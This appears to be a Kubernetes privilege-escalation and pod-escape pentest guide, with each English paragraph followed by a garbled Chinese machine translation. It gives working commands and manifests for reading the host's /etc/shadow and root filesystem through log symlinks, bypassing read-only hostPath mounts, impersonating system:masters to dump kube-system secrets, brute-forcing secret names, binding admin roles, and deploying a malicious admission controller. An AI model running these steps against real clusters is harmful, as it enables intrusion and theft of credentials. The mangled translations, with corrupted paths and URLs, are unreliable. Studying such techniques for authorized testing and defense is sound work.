The Kubelet service exposes the `/logs/` endpoint which is just basically **exposing the `/var/log` filesystem of the container**.

KubeletæœåŠ¡å…¬å¼€äº†`/logs/`ç«¯ç‚¹ï¼Œè¯¥ç‚¹åŸºæœ¬ä¸Š**å…¬å¼€äº†å®¹å™¨**çš„`/var/log`æ–‡ä»¶ç³»ç»Ÿã€‚

Therefore, an attacker with **access to write in the /var/log/ folder** of the container could abuse this behaviours in 2 ways:

å› æ­¤ï¼Œåœ¨å®¹å™¨çš„/var/log/folder **ä¸­ä½¿ç”¨**è®¿é—®ä¹¦å†™çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ»¥ç”¨æ­¤è¡Œä¸ºï¼š

* Modifying the `0.log` file of its container (usually located in `/var/logs/pods/namespace_pod_uid/container/0.log`) to be a **symlink pointing to `/etc/shadow`** for example. Then, you will be able to exfiltrate hosts shadow file doing:

*ä¿®æ”¹å…¶å®¹å™¨çš„`0.log'æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`/var/logs/pods/pods/namespace_pod_uid/container/0.log`ï¼‰ï¼Œä¸ºä¸€ä¸ª**ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘`/etc/etcshice/etcshice/shadow` ** ** for ä¾‹å­ã€‚ ç„¶åï¼Œæ‚¨å°†èƒ½å¤Ÿåˆ é™¤å®¿ä¸»çš„é˜´å½±æ–‡ä»¶ï¼š

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* If the attacker controls any principal with the **permissions to read `nodes/log`**, he can just create a **symlink** in `/host-mounted/var/log/sym` to `/` and when **accessing `https://<gateway>:10250/logs/sym/` he will lists the hosts root** filesystem (changing the symlink can provide access to files).

*å¦‚æœæ”»å‡»è€…æ§åˆ¶ä»»ä½•å§”æ‰˜äººéƒ½å…·æœ‰è¯»å–`nodes/log` **çš„æƒé™ **è®¿é—®`httpsï¼š// <Gateway>ï¼š10250/logs/sym/`ä»–å°†åˆ—å‡ºä¸»æœºroot ** filesystemï¼ˆæ›´æ”¹SYMLINKå¯ä»¥æä¾›å¯¹æ–‡ä»¶çš„è®¿é—®ï¼‰ã€‚

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**A laboratory and automated exploit can be found in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

**å¯ä»¥åœ¨** [** httpsï¼š//blog.aquasec.com/kubernetes-security-pod-escape-escape-log-mountsxphy]ä¸­æ‰¾åˆ°å®éªŒå®¤å’Œè‡ªåŠ¨åŒ–çš„åˆ©ç”¨ã€‚ /kubernetes-security-pod-escape-log-mountsï¼‰

#### Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

####ç»•è¿‡ReadOnly Protection <a href="#bypassing-hostpath-path-readonly-protection" id="bypassing-hostpath-hostpath-readonly-protection"> </a>

If you are lucky enough and the highly privileged capability capability `CAP_SYS_ADMIN` is available, you can just remount the folder as rw:

å¦‚æœæ‚¨è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”å…·æœ‰é«˜åº¦ç‰¹æƒçš„åŠŸèƒ½â€œ CAP_SYS_ADMINâ€ï¼Œåˆ™å¯ä»¥å°†æ–‡ä»¶å¤¹é‡æ–°å®‰è£…ä¸ºRWï¼š

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

####ç»•è¿‡ä¸»æŒäººreadonlyä¿æŠ¤<a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-hostpath-readonly-protection"> </a>

As stated in [**this research**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) itâ€™s possible to bypass the protection:

å¦‚[** [**]ï¼ˆhttps://jackleadford.github.io/containers/2020/03/06/pvpost.htmlï¼‰æ‰€è¿°ï¼Œå¯ä»¥ç»•è¿‡ä¿æŠ¤ï¼š

```yaml
allowedHostPaths:
    - pathPrefix: "/foo"
       readOnly: true
```

Which was meant to prevent escapes like the previous ones by, instead of using a a hostPath mount, use a PersistentVolume and a PersistentVolumeClaim to mount a hosts folder in the container with writable access:

è¿™æ˜¯ä¸ºäº†é˜²æ­¢åƒä»¥å‰çš„é€ƒè„±çš„é‚£æ ·ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ostent volumeï¼Œè€Œæ˜¯ä½¿ç”¨persistentvolumeå’ŒpersistentVolumeClaimå°†ä¸»æœºæ–‡ä»¶å¤¹å®‰è£…åœ¨å®¹å™¨ä¸­ï¼Œå¹¶å…·æœ‰å¯å†™å…¥çš„è®¿é—®ï¼š

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
    name: task-pv-volume-vol
    labels:
      type: local
spec:
    storageClassName: manual
    capacity:
      storage: 10Gi
    accessModes:
      - ReadWriteOnce
    hostPath:
      path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
    name: task-pv-claim-vol
spec:
    storageClassName: manual
    accessModes:
      - ReadWriteOnce
    resources:
      requests:
        storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
    name: task-pv-pod
spec:
    volumes:
      - name: task-pv-storage-vol
        persistentVolumeClaim:
          claimName: task-pv-claim-vol
    containers:
      - name: task-pv-container
        image: ubuntu:latest
        command: [ "sh", "-c", "sleep 1h" ]
        volumeMounts:
          - mountPath: "/hostlogs"
            name: task-pv-storage-vol
```

### **Impersonating privileged accounts**

### **æ¨¡ä»¿ç‰¹æƒå¸æˆ·**

With a [**user impersonation**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) privilege, an attacker could impersonate a privileged account.

å€ŸåŠ©[**ç”¨æˆ·æ¨¡ä»¿**]ï¼ˆhttps://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonationï¼‰æ”»å‡»è€…å¯ä»¥å†’å……ç‰¹æƒå¸æˆ·ã€‚

In this example, the service account _**sa-imper**_ has a binding to a ClusterRole with rules that allow it to impersonate groups and users.

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼ŒæœåŠ¡å¸æˆ·_ ** sa-imper ** _å¯¹ç¾¤é›†ä¸å…·æœ‰è§„åˆ™çš„ç»‘å®šï¼Œä½¿å…¶å¯ä»¥æ¨¡ä»¿ç»„å’Œç”¨æˆ·ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

ï¼

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

ï¼

It's possible to **list all secrets** with `--as=null --as-group=system:master` attributes:

å¯ä»¥**åˆ—å‡ºæ‰€æœ‰ç§˜å¯†**ç”¨`-as = null -As-group = systemï¼šmaster`å±æ€§ï¼š

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

ï¼

**It's also possible to perform the same action via the API REST endpoint:**

**ä¹Ÿå¯ä»¥é€šè¿‡APIä¼‘æ¯ç«¯ç‚¹æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼š**

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\ 
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### **Listing Secrets**

### **æ¸…å•ç§˜å¯†**

The **listing secrets privilege** is a strong capability to have in the cluster. A user with the permission to list secrets can **potentially view all the secrets in the cluster â€“ including the admin keys**. The secret key is a JWT token encoded in base64.

**åˆ—å‡ºç§˜å¯†ç‰¹æƒ**æ˜¯åœ¨é›†ç¾¤ä¸­æ‹¥æœ‰çš„å¼ºå¤§åŠŸèƒ½ã€‚ æœ‰æƒé™åˆ—å‡ºç§˜å¯†çš„ç”¨æˆ·å¯ä»¥**å¯èƒ½ä¼šæŸ¥çœ‹é›†ç¾¤ä¸­çš„æ‰€æœ‰ç§˜å¯† - åŒ…æ‹¬ç®¡ç†å‘˜å¯†é’¥**ã€‚ ç§˜å¯†é”®æ˜¯base64ä¸­ç¼–ç çš„JWTä»¤ç‰Œã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

ï¼

An attacker that gains **access to \_list secrets**\_ in the cluster can use the following _curl_ commands to get all secrets in â€œkube-systemâ€ namespace:

è·å¾—**è®¿é—®\ _list Secrets ** \ _çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»¥ä¸‹_curl_å‘½ä»¤åœ¨â€œ Kube-Systemâ€åç§°ç©ºé—´ä¸­è·å–æ‰€æœ‰ç§˜å¯†ï¼š

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Reading a secret â€“ brute-forcing token IDs**

### **é˜…è¯»ç§˜å¯† - è›®åŠ›ä»¤ç‰ŒID **

An attacker that found a token with permission to read a secret canâ€™t use this permission without knowing the full secretâ€™s name. This permission is different from the _**listing**  **secrets**_ permission described above.

ä¸€ä¸ªæ”»å‡»è€…å‘ç°æœ‰è®¸å¯é˜…è¯»ç§˜å¯†çš„ä»¤ç‰Œï¼Œå¦‚æœä¸çŸ¥é“æ•´ä¸ªç§˜å¯†çš„åå­—ï¼Œå°±æ— æ³•ä½¿ç”¨æ­¤è®¸å¯ã€‚ æ­¤æƒé™ä¸åŒäº_ **åˆ—è¡¨** **ç§˜å¯†** _ _ _çš„æƒé™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

ï¼

Although the attacker doesnâ€™t know the secretâ€™s name, there are default service accounts that can be enlisted.

å°½ç®¡æ”»å‡»è€…ä¸çŸ¥é“è¯¥ç§˜å¯†çš„åç§°ï¼Œä½†ä»æœ‰å¯ä»¥å…¥ä¼çš„é»˜è®¤æœåŠ¡å¸æˆ·ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

ï¼

Each service account has an associated secret with a static (non-changing) prefix and a postfix of a random five-character string token at the end.

æ¯ä¸ªæœåŠ¡å¸æˆ·éƒ½æœ‰ä¸€ä¸ªç›¸å…³çš„ç§˜å¯†ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªé™æ€ï¼ˆä¸å˜ï¼‰å‰ç¼€å’Œä¸€ä¸ªéšæœºäº”ä¸ªå­—ç¬¦å­—ç¬¦ä¸²ä»¤ç‰Œçš„åç¼€ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

ï¼

The random token structure is 5-character string built from alphanumeric (lower letters and digits) characters. **But it doesnâ€™t contain all the letters and digits.**

éšæœºä»¤ç‰Œç»“æ„æ˜¯ç”±å­—æ¯æ•°å­—ï¼ˆä¸‹å­—æ¯å’Œæ•°å­—ï¼‰å­—ç¬¦æ„å»ºçš„5ä¸ªå­—ç¬¦å­—ç¬¦ä¸²ã€‚ **ä½†å®ƒä¸åŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—ã€‚**

When looking inside the [source code](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), it appears that the token is generated from only 27 characters â€œbcdfghjklmnpqrstvwxz2456789â€ and not 36 (a-z and 0-9)

ä»¤ç‰Œä»…ç”±27ä¸ªå­—ç¬¦ç”Ÿæˆï¼Œâ€œ BCDFGHJKLMNPQRSTVWXZ2456789â€ï¼Œè€Œä¸æ˜¯36ï¼ˆA-Zå’Œ0-9ï¼‰

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

ï¼

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

ï¼

This means that there are 275 = 14,348,907 possibilities for a token.

è¿™æ„å‘³ç€ä»¤ç‰Œæœ‰275 = 14,348,907å¯èƒ½æ€§ã€‚

An attacker can run a brute-force attack to guess the token ID in couple of hours. Succeeding to get secrets from default sensitive service accounts will allow him to escalate privileges.

æ”»å‡»è€…å¯ä»¥è¿›è¡Œè›®åŠ›æ”»å‡»ï¼Œä»¥çŒœæµ‹å‡ ä¸ªå°æ—¶çš„ä»¤ç‰ŒIDã€‚ æˆåŠŸè·å¾—é»˜è®¤æ•æ„ŸæœåŠ¡å¸æˆ·çš„ç§˜å¯†å°†ä½¿ä»–èƒ½å¤Ÿå‡çº§ç‰¹æƒã€‚

## Built-in Privileged Escalation Prevention

##å†…ç½®ç‰¹æƒé¢„é˜²å‡çº§

Although there can be risky permissions, Kubernetes is doing good work preventing other types of permissions with potential for privileged escalation.

å°½ç®¡å¯èƒ½ä¼šæœ‰é£é™©çš„æƒé™ï¼Œä½†Kubernetesæ­£åœ¨åšå¥½å·¥ä½œï¼Œä»¥é˜²æ­¢å…¶ä»–ç±»å‹çš„æƒé™å…·æœ‰ç‰¹æƒå‡çº§æ½œåŠ›ã€‚

Kubernetes has a [built-in mechanism](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) for that:

Kubernetesæœ‰ä¸€ä¸ª[å†…ç½®æœºåˆ¶]ï¼ˆhttps://kubernetes.io/docs/reference/Access-Authn-authz/rbac/rbac/#privilege-escalation-caltilege-palrevention-palrevention-parrevention-and-bootstapphingä¸€ä¸‹ï¼š

â€œThe RBAC API **prevents users from escalating privileges** by editing roles or role bindings. Because this is enforced at the API level, it applies even when the RBAC authorizer is not in use.

â€œ RBAC API **é€šè¿‡ç¼–è¾‘è§’è‰²æˆ–è§’è‰²ç»‘å®šæ¥é˜»æ­¢ç”¨æˆ·å‡çº§ç‰¹æƒ**ã€‚ å› ä¸ºè¿™æ˜¯åœ¨APIçº§åˆ«æ‰§è¡Œçš„ï¼Œå› æ­¤å³ä½¿ä¸ä½¿ç”¨RBACæˆæƒå™¨ï¼Œä¹Ÿé€‚ç”¨ã€‚

A user can only **create/update a role if they already have all the permissions contained in the role**, at the same scope as the role (cluster-wide for a ClusterRole, within the same namespace or cluster-wide for a Role)â€

å¦‚æœç”¨æˆ·å·²ç»åœ¨è§’è‰²**ä¸­åŒ…å«çš„æ‰€æœ‰æƒé™ï¼Œä¸è§’è‰²ç›¸åŒçš„èŒƒå›´ï¼ˆclusterroleçš„ç¾¤é›†èŒƒå›´èŒƒå›´èŒƒå›´ï¼‰ï¼Œåˆ™åªèƒ½**åˆ›å»º/æ›´æ–°è§’è‰²ã€‚ è§’è‰²ï¼‰â€

Letâ€™s see an example for such prevention.

è®©æˆ‘ä»¬çœ‹çœ‹è¿™ç§é¢„é˜²çš„ä¾‹å­ã€‚

A service account named _sa7_ is in a RoleBinding _edit-role-rolebinding_. This RoleBinding object has a role named _edit-role_ that has **full permissions rules** on roles. Theoretically, it means that the service account can **edit** **any role** in the _default_ namespace.

ä¸€ä¸ªåä¸º_sa7_çš„æœåŠ¡å¸æˆ·å¤„äºè§’è‰²é™åˆ¶_edit-lole-lolebinding_ã€‚ è¿™ä¸ªè§’è‰²ç»‘å®šå¯¹è±¡å…·æœ‰ä¸€ä¸ªåä¸º_edit-role_çš„è§’è‰²ï¼Œè¯¥è§’è‰²åœ¨è§’è‰²ä¸Šå…·æœ‰å®Œæ•´çš„æƒé™è§„åˆ™**ã€‚ ä»ç†è®ºä¸Šè®²ï¼Œè¿™æ„å‘³ç€æœåŠ¡å¸æˆ·å¯ä»¥**ç¼–è¾‘** ** _default_åç§°ç©ºé—´ä¸­çš„ä»»ä½•è§’è‰²**ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

ï¼

There is also an existing role named _list-pods_. Anyone with this role can list all the pods on the _default_ namespace. The user _sa7_ should have permissions to edit any roles, so letâ€™s see what happens when it tries to add the â€œsecretsâ€ resource to the roleâ€™s resources.

è¿˜æœ‰ä¸€ä¸ªåä¸º_list-pods_çš„ç°æœ‰è§’è‰²ã€‚ æ‹…ä»»æ­¤è§’è‰²çš„ä»»ä½•äººéƒ½å¯ä»¥åˆ—å‡º_default_åç§°ç©ºé—´ä¸Šçš„æ‰€æœ‰PODã€‚ ç”¨æˆ·_sa7_åº”è¯¥å…·æœ‰ç¼–è¾‘ä»»ä½•è§’è‰²çš„æƒé™ï¼Œå› æ­¤è®©æˆ‘ä»¬çœ‹çœ‹å®ƒè¯•å›¾åœ¨è§’è‰²çš„èµ„æºä¸­æ·»åŠ â€œç§˜å¯†â€èµ„æºæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

After trying to do so, we will receive an error â€œforbidden: attempt to grant extra privilegesâ€ (Figure 31), because although our _sa7_ user has permissions to update roles for any resource, it can update the role only for resources that it has permissions over.

å°è¯•è¿™æ ·åšä¹‹åï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªé”™è¯¯â€œç¦æ­¢ï¼šå°è¯•æˆäºˆé¢å¤–çš„ç‰¹æƒâ€ï¼ˆå›¾31ï¼‰ï¼Œå› ä¸ºå°½ç®¡æˆ‘ä»¬çš„_sa7_ç”¨æˆ·æœ‰æƒæ›´æ–°ä»»ä½•èµ„æºçš„è§’è‰²ï¼Œä½†å®ƒåªèƒ½ä¸ºå…¶æ‹¥æœ‰çš„èµ„æºæ›´æ–°è§’è‰² æƒé™ç»“æŸäº†ã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Get & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparently this technique worked before, but according to my tests it's not working anymore for the same reason explained in the previous section. Yo cannot create/modify a rolebinding to give yourself or a different SA some privileges if you don't have already.**

**æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯ä»¥å‰æœ‰æ•ˆï¼Œä½†æ˜¯æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œç”±äºä¸Šä¸€èŠ‚ä¸­æ‰€è¿°çš„ç›¸åŒåŸå› ï¼Œå®ƒä¸å†èµ·ä½œç”¨ã€‚ å¦‚æœæ‚¨è¿˜æ²¡æœ‰ï¼Œåˆ™æ— æ³•åˆ›å»º/ä¿®æ”¹è§’è‰²ç­¾åï¼Œä»¥èµ‹äºˆæ‚¨è‡ªå·±æˆ–å…¶ä»–SAçš„ç‰¹æƒã€‚**
{% endhint %}

The privilege to create Rolebindings allows a user to **bind roles to a service account**. This privilege can potentially lead to privilege escalation because it **allows the user to bind admin privileges to a compromised service account.**

åˆ›å»ºè§’è‰²ç­¾åçš„ç‰¹æƒä½¿ç”¨æˆ·å¯ä»¥å°†è§’è‰²ç»‘å®šåˆ°æœåŠ¡å¸æˆ·**ã€‚ æ­¤ç‰¹æƒå¯èƒ½ä¼šå¯¼è‡´ç‰¹æƒå‡çº§ï¼Œå› ä¸ºå®ƒ**å…è®¸ç”¨æˆ·å°†ç®¡ç†å‘˜ç‰¹æƒç»‘å®šåˆ°å—æŸçš„æœåŠ¡å¸æˆ·ã€‚**

The following ClusterRole is using the special verb _bind_ that allows a user to create a RoleBinding with _admin_ ClusterRole (default high privileged role) and to add any user, including itself, to this admin ClusterRole.

ä»¥ä¸‹clusterroleæ˜¯ä½¿ç”¨ç‰¹æ®ŠåŠ¨è¯_bind_ï¼Œè¯¥_bind_å…è®¸ç”¨æˆ·ä½¿ç”¨_admin_ clusterroleï¼ˆé»˜è®¤çš„é«˜ç‰¹æƒè§’è‰²ï¼‰åˆ›å»ºè§’è‰²é™åˆ¶ï¼Œå¹¶å°†åŒ…æ‹¬æœ¬èº«åœ¨å†…çš„ä»»ä½•ç”¨æˆ·æ·»åŠ åˆ°æ­¤admin clusterroleã€‚

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

ï¼

Then it's possible to create **`malicious-RoleBinging.json`**, which **binds the admin role to other compromised service account:**

ç„¶åå¯ä»¥åˆ›å»º**``æ¶æ„ - åˆºæ¿€ã€‚

```javascript
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "compromised-svc"
            "namespace": "default"
        }
    ]
}
```

The purpose of this JSON file is to bind the admin â€œCluserRoleâ€ (line 11) to the compromised service account (line 16).

è¯¥JSONæ–‡ä»¶çš„ç›®çš„æ˜¯å°†ç®¡ç†å‘˜â€œ cluserroleâ€ï¼ˆç¬¬11è¡Œï¼‰ç»‘å®šåˆ°å—æŸçš„æœåŠ¡å¸æˆ·ï¼ˆç¬¬16è¡Œï¼‰ã€‚

Now, all we need to do is to send our JSON as a POST request to the API using the following CURL command:

ç°åœ¨ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ä½¿ç”¨ä»¥ä¸‹curlå‘½ä»¤å°†æˆ‘ä»¬çš„JSONä½œä¸ºPOSTè¯·æ±‚å‘é€åˆ°APIï¼š

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \ 
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
 -d @malicious-RoleBinging.json
```

After the **admin role is bound to the â€œcompromised-svcâ€ service account**, we can use the compromised service account token to **list secrets**. The following CURL command will do this:

**ç®¡ç†å‘˜è§’è‰²è¢«ç»‘å®šåˆ°â€œå¦¥åçš„SVCâ€æœåŠ¡å¸æˆ·**ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°†æŠ˜è¡·çš„æœåŠ¡å¸æˆ·ä»¤ç‰Œä½¿ç”¨åˆ°**åˆ—è¡¨ç§˜å¯†**ã€‚ ä»¥ä¸‹å·æ›²å‘½ä»¤å°†æ‰§è¡Œæ­¤æ“ä½œï¼š

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

## Other Attacks

##å…¶ä»–æ”»å‡»

### S**idecar proxy app**

By default there isn't any encryption in the communication between pods .Mutual authentication, two-way, pod to pod.

é»˜è®¤æƒ…å†µä¸‹ï¼ŒPodsä¹‹é—´çš„é€šä¿¡ä¸­æ²¡æœ‰ä»»ä½•åŠ å¯†ã€‚Mutualè®¤è¯ï¼ŒåŒå‘ï¼ŒPODåˆ°PODã€‚

#### Create a sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

#### Create a sidecar proxy app <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Create your .yaml

åˆ›å»ºæ‚¨çš„.yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edit your .yaml and add the uncomment lines:

ç¼–è¾‘æ‚¨çš„.YAMLå¹¶æ·»åŠ æœªç‚¹å‡»è¡Œï¼š

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
    command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]
 #   volumeMounts:
 #   - name: sec-ctx-vol
 #     mountPath: /data/demo
 #   securityContext:
 #     allowPrivilegeEscalation: true
```

See the logs of the proxy:

è¯·å‚é˜…ä»£ç†çš„æ—¥å¿—ï¼š

```bash
kubectl logs app -C proxy
```

More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

æ›´å¤šä¿¡æ¯ï¼Œç½‘å€ï¼š[https://kubernetes.io/docs/tasks/configure-pod-container/security-container/security-context/]ï¼ˆ /ï¼‰

### Malicious Admission Controller

###æ¶æ„å…¥å­¦æ§åˆ¶å™¨

An admission controller is a piece of code that **intercepts requests to the Kubernetes API server** before the persistence of the object, but **after the request is authenticated** **and authorized**.

å…¥å­¦æ§åˆ¶å™¨æ˜¯**åœ¨å¯¹è±¡æŒç»­å­˜åœ¨ä¹‹å‰ï¼Œ**æ‹¦æˆªå¯¹Kubernetes APIæœåŠ¡å™¨çš„è¯·æ±‚**ï¼Œä½†æ˜¯**åœ¨è¯·æ±‚å**è¿›è¡Œèº«ä»½éªŒè¯** **å¹¶æˆæƒ**ã€‚

![](<../../../.gitbook/assets/image (651) (1) (1) (1) (1) (1).png>)

If an attacker somehow manages to **inject a Mutationg Adminssion Controller**, he will be able to **modify already authenticated requests**. Being able to potentially privesc, and more usually persist in the cluster.

å¦‚æœæ”»å‡»è€…ä»¥æŸç§æ–¹å¼è®¾æ³•**æ³¨å…¥çªå˜gyminssionæ§åˆ¶å™¨**ï¼Œä»–å°†èƒ½å¤Ÿ**ä¿®æ”¹å·²éªŒè¯çš„è¯·æ±‚**ã€‚ èƒ½å¤Ÿæ½œåœ¨åœ°æé«˜ç¾¤é›†ï¼Œå¹¶ä¸”é€šå¸¸ä¼šæŒç»­å­˜åœ¨ã€‚

Example from [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

ç¤ºä¾‹æ¥è‡ª[https://blog.rewanthtammana.com/creating-malicious-abismiss-controllers]ï¼ˆ

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Wait until the webhook server is ready. Check the status:

ç­‰åˆ°WebhookæœåŠ¡å™¨å‡†å¤‡å°±ç»ªã€‚ æ£€æŸ¥çŠ¶æ€ï¼š

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ï¼[mutating-webhook-status-check.png]ï¼ˆhttps://cdn.hashnode.com/res/res/hashnode/image/upload/v16284343434343434343353/yhuvuwwugr.png?auto=compress.porress.format = wewewewewewewugr.p.

Once we have our malicious mutating webhook running, let's deploy a new pod.

ä¸€æ—¦æˆ‘ä»¬è¿›è¡Œäº†æ¶æ„å˜å¼‚çš„Webhookè¿è¡Œï¼Œè®©æˆ‘ä»¬éƒ¨ç½²ä¸€ä¸ªæ–°çš„PODã€‚

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Wait again, until you see the change in pod status. Now, you can see `ErrImagePull` error. Check the image name with either of the queries.

å†æ¬¡ç­‰å¾…ï¼Œç›´åˆ°æ‚¨çœ‹åˆ°PODçŠ¶æ€çš„å˜åŒ–ã€‚ ç°åœ¨ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°â€œ ermimagepullâ€é”™è¯¯ã€‚ ä½¿ç”¨ä»»ä½•ä¸€ä¸ªæŸ¥è¯¢æ£€æŸ¥å›¾åƒåç§°ã€‚

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ï¼[MALICIT-IDMISSION-CONTROLLER.PNG]ï¼ˆhttps://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/lefxtgszm.png?auto = compressempressempressempressempressempressempressemtat \ format = webpï¼‰

As you can see in the above image, we tried running image `nginx` but the final executed image is `rewanthtammana/malicious-image`. What just happened!!?

å¦‚æ‚¨åœ¨ä¸Šé¢çš„å›¾åƒä¸­æ‰€è§ï¼Œæˆ‘ä»¬å°è¯•è¿è¡Œå›¾åƒ`nginx'ï¼Œä½†æœ€ç»ˆæ‰§è¡Œçš„å›¾åƒæ˜¯`rewanthtammana/alialicimageâ€œã€‚ åˆšæ‰å‘ç”Ÿäº†ä»€ä¹ˆï¼ï¼ï¼Ÿ

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

####æŠ€æœ¯æ€§<a href="#heading-technicalities" id="heading-technicalities"> </a>

We will unfold what just happened. The `./deploy.sh` script that you executed, created a mutating webhook admission controller. The below lines in the mutating webhook admission controller are responsible for the above results.

